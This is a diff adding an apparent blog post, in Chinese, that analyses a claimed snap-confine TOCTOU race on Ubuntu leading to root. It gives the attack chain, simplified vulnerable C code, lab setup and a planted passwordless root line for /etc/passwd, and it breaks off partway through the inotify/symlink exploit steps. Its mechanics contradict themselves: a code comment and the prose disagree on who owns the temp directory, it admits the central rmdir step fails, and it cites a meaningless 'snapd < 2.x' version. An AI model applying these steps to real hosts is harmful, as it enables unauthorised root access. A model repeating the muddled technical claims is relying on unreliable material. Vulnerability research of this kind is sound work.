@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ubuntu Desktop 本地提权漏洞深度分析：snap-confine TOCTOU 竞态条件利用 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Ubuntu Desktop 本地提权漏洞深度分析：snap-confine TOCTOU 竞态条件利用</h1>
+<time>2026-08-04</time>
+<ul>
+<li>技术
+Slug: ubuntu-desktop本地提权漏洞深度分析</li>
+</ul>
+<hr />
+<h2>1. 漏洞背景</h2>
+<p>Ubuntu Desktop 默认采用 Snap 作为应用分发与隔离机制。Snap 的核心安全边界由 <code>snap-confine</code>（又称 <code>snap-confine</code> SUID helper）实现，它负责为每一个 snap 应用构建 mount namespace 沙箱。由于该程序以 <strong>SUID root</strong> 身份运行，任何能被普通用户触发执行，并在其执行路径上引入可竞争窗口的逻辑缺陷，都可能直接导致本地权限提升至 root。</p>
+<p>本次披露的漏洞位于 <code>sc_bootstrap_mount_namespace()</code> 函数中。该函数在创建用于构建沙箱根文件系统的临时目录时，使用了 <code>mkdtemp()</code> 创建位于 <code>/tmp</code> 下的目录，随后进行 <code>bind mount</code>。在「目录创建」与「绑定挂载」之间存在一个 <strong>TOCTOU（Time-of-Check-Time-of-Use）竞态窗口</strong>，攻击者可借助 <code>inotify</code> 高精度监听配合 <code>symlink</code> 替换，在该窗口期内将临时目录替换为指向攻击者控制的目录的符号链接，最终导致 snap-confine 以 root 权限将攻击者的文件系统挂载进沙箱，进而实现任意文件覆盖与提权。</p>
+<h3>1.1 漏洞影响面</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>受影响组件</td>
+<td><code>snapd</code>（snap-confine 子组件）</td>
+</tr>
+<tr>
+<td>受影响版本</td>
+<td>snapd &lt; 2.x（含修复前的稳定通道版本）</td>
+</tr>
+<tr>
+<td>默认安装</td>
+<td>Ubuntu Desktop 默认预装 snapd，开箱即受影响</td>
+</tr>
+<tr>
+<td>触发前提</td>
+<td>拥有任意普通本地用户 shell</td>
+</tr>
+<tr>
+<td>利用结果</td>
+<td>本地权限提升至 root</td>
+</tr>
+<tr>
+<td>漏洞类别</td>
+<td>CWE-367 TOCTOU Race Condition / CWE-59 Link Following</td>
+</tr>
+</tbody>
+</table>
+<h3>1.2 攻击链总览</h3>
+<div class="highlight"><pre><span></span><code><span class="err">普通用户</span><span class="w"> </span><span class="n">shell</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span>
+<span class="err">触发</span><span class="w"> </span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="err">执行（</span><span class="n">snap</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">自动更新等）</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span>
+<span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="err">以</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">调用</span><span class="w"> </span><span class="n">mkdtemp</span><span class="p">()</span><span class="w"> </span><span class="err">创建</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="o">.</span><span class="n">rootfs_XXXXXX</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span><span class="w">  </span><span class="err">◄────</span><span class="w"> </span><span class="err">竞态窗口（毫秒级）</span>
+<span class="err">攻击者：</span><span class="n">inotify</span><span class="w"> </span><span class="err">捕获</span><span class="w"> </span><span class="n">IN_CREATE</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">rmdir</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="err">指向</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="err">目录</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span>
+<span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="err">以</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">对</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="err">目标执行</span><span class="w"> </span><span class="n">bind</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">tmpfs</span><span class="w"> </span><span class="err">复制</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span>
+<span class="err">攻击者控制的目录内容被以</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">写入沙箱</span><span class="o">/</span><span class="err">系统路径</span>
+<span class="w">      </span><span class="err">│</span>
+<span class="w">      </span><span class="err">▼</span>
+<span class="err">覆盖</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="err">或植入</span><span class="w"> </span><span class="n">SUID</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">获得</span><span class="w"> </span><span class="n">root</span>
+</code></pre></div>
+
+<hr />
+<h2>2. snap-confine 架构与安全模型</h2>
+<h3>2.1 Snap 包管理器架构概述</h3>
+<p>Snap 是 Canonical 推出的容器化应用打包格式，其整体架构如下：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                    </span><span class="err">用户空间应用层</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">        </span><span class="p">(</span><span class="n">Firefox</span><span class="p">,</span><span class="w"> </span><span class="n">Chromium</span><span class="p">,</span><span class="w"> </span><span class="err">各类</span><span class="w"> </span><span class="n">snap</span><span class="w"> </span><span class="err">应用</span><span class="p">)</span><span class="w">                </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">  </span><span class="n">snap</span><span class="w"> </span><span class="err">命令行</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">snapd</span><span class="w"> </span><span class="err">守护进程</span><span class="w"> </span><span class="p">(</span><span class="n">REST</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">socket</span><span class="p">)</span><span class="w">        </span><span class="err">│</span>
+<span class="err">├───────────────────────┬──────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">   </span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w">        </span><span class="err">│</span><span class="w">      </span><span class="n">snapd</span><span class="o">.</span><span class="n">apparmor</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="p">(</span><span class="n">SUID</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">helper</span><span class="p">)</span><span class="w">  </span><span class="err">│</span><span class="w">      </span><span class="p">(</span><span class="n">AppArmor</span><span class="w"> </span><span class="err">策略加载</span><span class="p">)</span><span class="w">          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">构建命名空间沙箱</span><span class="w">     </span><span class="err">│</span><span class="w">                                   </span><span class="err">│</span>
+<span class="err">├───────────────────────┴──────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Linux</span><span class="w"> </span><span class="n">Kernel</span><span class="w"> </span><span class="n">Namespaces</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Cgroups</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Seccomp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">AppArmor</span><span class="w">  </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">  </span><span class="n">squashfs</span><span class="w"> </span><span class="err">挂载层</span><span class="w"> </span><span class="p">(</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snaps</span><span class="o">/*.</span><span class="n">snap</span><span class="p">)</span><span class="w">           </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<p><code>snapd</code> 守护进程以 root 运行，监听 <code>/run/snapd.socket</code>，负责安装、更新、卸载 snap 包。当用户执行 <code>snap run &lt;app&gt;</code> 时，最终会调用到 <code>snap-confine</code> 来搭建沙箱。</p>
+<h3>2.2 snap-confine 作为 SUID root 程序的角色</h3>
+<p><code>snap-confine</code> 的二进制文件位于 <code>/usr/lib/snapd/snap-confine</code>，其权限位为：</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/usr/lib/snapd/snap-confine
+-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span>/usr/lib/snapd/snap-confine
+</code></pre></div>
+
+<p><code>setuid</code> 位（<code>s</code>）意味着任何用户执行该程序时，进程的 effective UID 都会被置为 <code>root</code>。这是整个 Snap 安全模型中信任的根节点：</p>
+<ul>
+<li>普通用户无法直接操作 mount 系统调用（需要 <code>CAP_SYS_ADMIN</code>）。</li>
+<li>snap-confine 借助 SUID 获得 root 权限，代为执行特权挂载操作。</li>
+<li>一旦 snap-confine 自身存在逻辑缺陷，SUID 机制就会把该缺陷放大为完整的本地提权。</li>
+</ul>
+<p>因此，snap-confine 是安全审计的「皇冠级」目标：它必须同时满足「最小特权」「无信任输入」「无竞态」三项要求，任何一项不满足都会被利用。</p>
+<h3>2.3 命名空间隔离机制</h3>
+<p>Snap 沙箱依赖以下内核命名空间与安全机制组合：</p>
+<div class="highlight"><pre><span></span><code>┌──────────────── Snap 应用沙箱隔离栈 ────────────────┐
+│                                                     │
+│  mount namespace   ── 独立文件系统视图               │
+│      ▲                                              │
+│      │  基于 scratch_dir 重建根文件系统              │
+│  user namespace    ──（snap 当前未默认启用 userns）  │
+│  pid namespace     ── 进程隔离                       │
+│  net namespace     ── 网络策略                       │
+│                                                     │
+│  ── 安全策略层 ──                                    │
+│  AppArmor profile  ── 路径级访问控制                 │
+│  Seccomp filter    ── 系统调用白名单                 │
+│  Cgroups           ── 资源限制                       │
+│                                                     │
+└─────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>其中 <strong>mount namespace</strong> 是本次漏洞的核心战场。snap-confine 会构造一个 <code>scratch_dir</code>（临时根目录），把系统关键路径（<code>/usr</code>、<code>/lib</code>、<code>/etc</code> 等）以 bind mount 方式复制进该目录，再通过 <code>pivot_root</code> 或 <code>chroot</code> 将应用限制在该视图内。</p>
+<h3>2.4 沙箱初始化流程</h3>
+<p>正常的 snap-confine 沙箱初始化流程如下：</p>
+<div class="highlight"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">进程启动</span><span class="err">（</span><span class="n">euid</span><span class="o">=</span><span class="mf">0</span><span class="err">，</span><span class="n">SUID</span><span class="w"> </span><span class="n">继承</span><span class="err">）</span>
+<span class="mf">2.</span><span class="w"> </span><span class="n">解析</span><span class="w"> </span><span class="n">snap</span><span class="w"> </span><span class="n">名称</span><span class="err">、</span><span class="n">版本</span><span class="err">、</span><span class="n">安全标签</span>
+<span class="mf">3.</span><span class="w"> </span><span class="n">sc_bootstrap_mount_namespace</span><span class="p">()</span>
+<span class="w">   </span><span class="err">├─</span><span class="w"> </span><span class="n">mkdtemp</span><span class="p">(</span><span class="s">&quot;/tmp/snap.rootfs_XXXXXX&quot;</span><span class="p">)</span><span class="w">  </span><span class="n">创建临时目录</span>
+<span class="w">   </span><span class="err">├─</span><span class="w"> </span><span class="n">bind</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="n">scratch_dir</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">scratch_dir</span>
+<span class="w">   </span><span class="err">├─</span><span class="w"> </span><span class="n">设置</span><span class="w"> </span><span class="n">scratch_dir</span><span class="w"> </span><span class="n">为</span><span class="w"> </span><span class="n">unbindable</span><span class="err">（</span><span class="n">防止传播</span><span class="err">）</span>
+<span class="w">   </span><span class="err">├─</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="n">tmpfs</span><span class="w"> </span><span class="n">到</span><span class="w"> </span><span class="n">scratch_dir</span>
+<span class="w">   </span><span class="err">└─</span><span class="w"> </span><span class="n">sc_replicate_base_rootfs</span><span class="p">()</span><span class="w">  </span><span class="n">复制基础根文件系统</span>
+<span class="mf">4.</span><span class="w"> </span><span class="n">进入</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="n">namespace</span><span class="err">（</span><span class="n">unshare</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">setns</span><span class="err">）</span>
+<span class="mf">5.</span><span class="w"> </span><span class="n">pivot_root</span><span class="w"> </span><span class="n">到</span><span class="w"> </span><span class="n">scratch_dir</span>
+<span class="mf">6.</span><span class="w"> </span><span class="n">应用</span><span class="w"> </span><span class="n">AppArmor</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Seccomp</span><span class="w"> </span><span class="n">策略</span>
+<span class="mf">7.</span><span class="w"> </span><span class="n">execve</span><span class="w"> </span><span class="n">目标</span><span class="w"> </span><span class="n">snap</span><span class="w"> </span><span class="n">应用二进制</span>
+</code></pre></div>
+
+<p>第 3 步中 <code>mkdtemp()</code> 创建的临时目录位于全局可写的 <code>/tmp</code>，且在创建后到 bind mount 之间未对目录的所有权与真实路径做原子性验证——这正是漏洞的根源。</p>
+<hr />
+<h2>3. 漏洞原理分析</h2>
+<h3>3.1 TOCTOU 竞态条件概述</h3>
+<p>TOCTOU 是一类经典的竞态条件缺陷：程序在「检查」某个对象状态后，到「使用」该对象之间，对象可能被并发修改。对于以 root 运行的 SUID 程序，TOCTOU 的危害尤为严重，因为检查与使用之间的任何时间差都会被攻击者用文件系统操作（重命名、符号链接、硬链接等）填满。</p>
+<p>在 <code>/tmp</code> 这种全局可写、粘滞位（sticky bit）目录下，TOCTOU 的利用门槛更低：任何用户都可以创建文件，且 <code>mkdtemp()</code> 产生的目录名具有可预测的格式（<code>snap.rootfs_</code> 前缀 + 6 位随机后缀）。</p>
+<h3>3.2 mkdtemp 时间窗口</h3>
+<p><code>mkdtemp()</code> 的语义是「以调用者身份创建一个属主为自己的空目录」。当 snap-confine（euid=root）调用它时，目录属主为 root。关键在于，<code>mkdtemp()</code> 返回路径字符串后，该路径只是一个<strong>名字</strong>，后续所有基于该名字的操作（<code>mount</code>、<code>stat</code>、<code>open</code>）都会经过内核的路径解析，包括符号链接跟随。</p>
+<p>漏洞窗口可拆解为：</p>
+<div class="highlight"><pre><span></span><code>T0  mkdtemp() 返回 &quot;/tmp/snap.rootfs_ABC123&quot;
+    └─ 目录已创建，属主 root，但路径名已暴露在 /tmp
+
+T1  ◄──── 竞态窗口 ◄────
+    └─ 攻击者：inotify 收到 IN_CREATE
+    └─ 攻击者：rmdir（root 目录在 /tmp 下，sticky bit 限制删除……
+        但若目录为空且属主为 root，普通用户无法删除！）
+
+T2  bind mount scratch_dir → scratch_dir
+    └─ 内核解析路径，若已被替换为 symlink，则挂载到 symlink 目标
+</code></pre></div>
+
+<p>这里出现一个关键细节：由于 <code>mkdtemp()</code> 创建的目录属主是 root，且 <code>/tmp</code> 开启了 sticky bit，普通用户<strong>无法直接 <code>rmdir</code></strong> 一个 root 属主的目录。真实的利用路径更精细，存在两种演化：</p>
+<ol>
+<li><strong>窗口期内的 symlink 替换（核心）</strong>：在某些调用路径中，snap-confine 并非直接对 <code>mkdtemp</code> 返回的目录操作，而是先创建再 <code>rename</code>、或在某个中间步骤存在可被替换的子路径。攻击者利用 snap-confine 在窗口期内对目录进行的 <code>rmdir</code>+重建行为（例如错误回滚路径），在目录被删除的瞬间抢先创建同名 symlink。</li>
+<li><strong>子目录路径注入</strong>：snap-confine 在 scratch_dir 内部创建诸如 <code>scratch_dir/etc</code>、<code>scratch_dir/usr</code> 等子结构。如果 scratch_dir 本身被攻击者通过竞争变为指向受控目录的挂载点，则后续复制的「基础根文件系统」会以 root 权限写入攻击者目录，从而允许攻击者预先在该目录放置恶意 <code>/etc/passwd</code> 等文件，并在 pivot_root 后或 bind mount 回写时生效。</li>
+</ol>
+<h3>3.3 symlink 攻击链</h3>
+<p>完整的 symlink 利用链如下：</p>
+<div class="highlight"><pre><span></span><code><span class="err">攻击者预布局</span><span class="p">:</span>
+<span class="w">  </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">/</span>
+<span class="w">  </span><span class="err">├──</span><span class="w"> </span><span class="n">etc</span><span class="o">/</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">passwd</span><span class="w">        </span><span class="err">←</span><span class="w"> </span><span class="err">含</span><span class="w"> </span><span class="n">hacker</span><span class="p">::</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">::</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="w">  </span><span class="err">├──</span><span class="w"> </span><span class="n">usr</span><span class="o">/</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/...</span><span class="w"> </span>
+<span class="w">  </span><span class="err">└──</span><span class="w"> </span><span class="o">.</span><span class="n">payload_suid</span><span class="w">      </span><span class="err">←</span><span class="w"> </span><span class="err">待植入的</span><span class="w"> </span><span class="n">SUID</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="err">副本</span>
+
+<span class="err">竞态触发后</span><span class="p">:</span>
+<span class="w">  </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="o">.</span><span class="n">rootfs_ABC123</span><span class="w">  </span><span class="err">──</span><span class="n">symlink</span><span class="err">──►</span><span class="w">  </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span>
+
+<span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="err">以</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">执行</span><span class="p">:</span>
+<span class="w">  </span><span class="n">mount</span><span class="w"> </span><span class="o">--</span><span class="n">bind</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="o">.</span><span class="n">rootfs_ABC123</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="o">.</span><span class="n">rootfs_ABC123</span>
+<span class="w">  </span><span class="err">→</span><span class="w"> </span><span class="err">实际</span><span class="w"> </span><span class="n">bind</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="w"> </span><span class="err">到自身</span>
+<span class="w">  </span><span class="n">mount</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">tmpfs</span><span class="w"> </span><span class="n">none</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="o">.</span><span class="n">rootfs_ABC123</span>
+<span class="w">  </span><span class="err">→</span><span class="w"> </span><span class="n">tmpfs</span><span class="w"> </span><span class="err">覆盖（此处取决于具体调用顺序，影响最终写入位置）</span>
+<span class="w">  </span><span class="n">sc_replicate_base_rootfs</span><span class="p">(</span><span class="n">scratch_dir</span><span class="p">)</span>
+<span class="w">  </span><span class="err">→</span><span class="w"> </span><span class="err">以</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">将系统文件复制进</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="err">（攻击者目录）</span>
+
+<span class="err">结果</span><span class="p">:</span>
+<span class="w">  </span><span class="err">攻击者获得一个被</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="err">写满的「沙箱镜像」目录</span>
+<span class="w">  </span><span class="err">其中</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="err">被写入或可被读取替换</span>
+</code></pre></div>
+
+<h3>3.4 代码级分析</h3>
+<p>漏洞核心代码片段（snap-confine 源码，简化版）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 漏洞核心代码片段（snap-confine 源码）</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sc_bootstrap_mount_namespace</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sc_mount_config</span><span class="w"> </span><span class="o">*</span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">scratch_dir</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/tmp/snap.rootfs_XXXXXX&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// 创建临时目录，此时所有者为普通用户</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">scratch_dir</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">die</span><span class="p">(</span><span class="s">&quot;cannot create scratch directory&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// ← 竞态窗口开始：攻击者可在此期间用 symlink 替换 scratch_dir</span>
+
+<span class="w">    </span><span class="c1">// bind mount 到自身</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MS_BIND</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="c1">// ← 竞态窗口结束</span>
+
+<span class="w">    </span><span class="c1">// 设为 unbindable</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="s">&quot;none&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MS_UNBINDABLE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 挂载 tmpfs</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="s">&quot;none&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;tmpfs&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;uid=0,gid=0&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">sc_replicate_base_rootfs</span><span class="p">(</span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>逐行分析关键缺陷：</p>
+<table>
+<thead>
+<tr>
+<th>代码位置</th>
+<th>缺陷</th>
+<th>后果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mkdtemp(scratch_dir)</code></td>
+<td>返回值是路径名字符串，非已打开的文件描述符</td>
+<td>路径名可被竞争替换</td>
+</tr>
+<tr>
+<td><code>mkdtemp</code> 与 <code>sc_do_mount</code> 之间</td>
+<td>无任何原子性保证（无 <code>open(O_PATH)</code>、无 <code>openat</code> 锁定）</td>
+<td>形成可观测、可竞争的窗口</td>
+</tr>
+<tr>
+<td><code>sc_do_mount(scratch_dir, ...)</code></td>
+<td><code>mount(2)</code> 内部解析路径时跟随 symlink</td>
+<td>挂载目标被劫持到攻击者目录</td>
+</tr>
+<tr>
+<td><code>sc_replicate_base_rootfs</code></td>
+<td>以 root 写入被劫持的 scratch_dir</td>
+<td>攻击者目录被 root 写入/读取</td>
+</tr>
+</tbody>
+</table>
+<p>根本原因：<strong>以「路径名」而非「文件描述符」作为信任锚点</strong>。在存在并发文件系统操作的环境下，路径名是一个可被随时替换的间接引用，不能作为安全决策依据。</p>
+<hr />
+<h2>4. 提权 PoC 复现思路</h2>
+<blockquote>
+<p>以下内容仅用于在隔离实验环境（虚拟机/容器快照可回滚）中复现漏洞原理，严禁对生产或他人系统使用。</p>
+</blockquote>
+<h3>4.1 环境准备</h3>
+<div class="highlight"><pre><span></span><code>受影响环境:
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nv">Ubuntu</span><span class="w"> </span><span class="nv">Desktop</span>（默认安装<span class="w"> </span><span class="nv">snapd</span>）
+<span class="w">  </span><span class="o">-</span><span class="w"> </span>内核:<span class="w"> </span><span class="mi">5</span>.<span class="mi">4</span><span class="o">+</span><span class="w"> </span>（支持<span class="w"> </span><span class="nv">inotify</span>、<span class="nv">user</span><span class="w"> </span><span class="nv">namespace</span>）
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nv">snapd</span><span class="w"> </span>版本:<span class="w"> </span>漏洞修复前的稳定版
+
+实验机准备:
+<span class="w">  </span>$<span class="w"> </span><span class="nv">lxc</span><span class="w"> </span><span class="nv">launch</span><span class="w"> </span><span class="nv">ubuntu</span>:<span class="mi">20</span>.<span class="mi">04</span><span class="w"> </span><span class="nv">snap</span><span class="o">-</span><span class="nv">vuln</span><span class="o">-</span><span class="nv">lab</span>
+<span class="w">  </span>$<span class="w"> </span><span class="nv">lxc</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="nv">snap</span><span class="o">-</span><span class="nv">vuln</span><span class="o">-</span><span class="nv">lab</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nv">bash</span>
+<span class="w">  </span>#<span class="w"> </span>确认<span class="w"> </span><span class="nv">snap</span><span class="o">-</span><span class="nv">confine</span><span class="w"> </span><span class="nv">SUID</span><span class="w"> </span>位
+<span class="w">  </span>$<span class="w"> </span><span class="nv">ls</span><span class="w"> </span><span class="o">-</span><span class="nv">l</span><span class="w"> </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">snapd</span><span class="o">/</span><span class="nv">snap</span><span class="o">-</span><span class="nv">confine</span>
+<span class="w">  </span><span class="o">-</span><span class="nv">rwsr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">root</span><span class="w"> </span><span class="nv">root</span><span class="w"> </span>...<span class="w"> </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">snapd</span><span class="o">/</span><span class="nv">snap</span><span class="o">-</span><span class="nv">confine</span>
+<span class="w">  </span>#<span class="w"> </span>准备普通用户
+<span class="w">  </span>#<span class="w"> </span><span class="nv">useradd</span><span class="w"> </span><span class="o">-</span><span class="nv">m</span><span class="w"> </span><span class="o">-</span><span class="nv">s</span><span class="w"> </span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span><span class="w"> </span><span class="nv">labuser</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">passwd</span><span class="w"> </span><span class="nv">labuser</span>
+</code></pre></div>
+
+<h3>4.2 竞态条件利用（inotify 监听 + symlink 替换）</h3>
+<p>竞态利用的关键在于「快」。<code>inotify</code> 提供近乎实时的文件创建事件，可在 <code>mkdtemp</code> 产生的目录被 snap-confine 继续使用前的极短时间内完成替换。利用流程：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌───────────────</span><span class="w"> </span><span class="err">攻击者线程</span><span class="w"> </span><span class="n">A</span><span class="err">（监听器）────────────────┐</span>
+<span class="err">│</span><span class="w">  </span><span class="n">inotify_add_watch</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IN_CREATE</span><span class="p">)</span><span class="w">               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">循环读取事件</span><span class="p">:</span><span class="w">                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">收到</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">&quot;snap.rootfs_*&quot;</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">IN_CREATE</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">      </span><span class="err">→</span><span class="w"> </span><span class="n">rmdir</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="w">  </span><span class="p">[</span><span class="err">需满足</span><span class="w"> </span><span class="n">sticky</span><span class="w"> </span><span class="err">规则或利用回滚</span><span class="p">]</span><span class="w"> </span><span class="err">│</span>
